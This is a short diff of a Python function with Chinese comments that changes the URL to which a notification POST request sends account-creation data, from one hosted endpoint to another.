@@ -179,7 +179,7 @@ def send_success_notification(user, user_agent):
 
         # 发送 POST 请求
         response = requests.post(
-            "https://keamlv.serv00.net/create_account.php",
+            "https://cnmserv00.us.kg/create_account.php",
             headers={"Content-Type": "application/json"},
             data=json.dumps(data)  # 将数据转换为 JSON 格式
         )
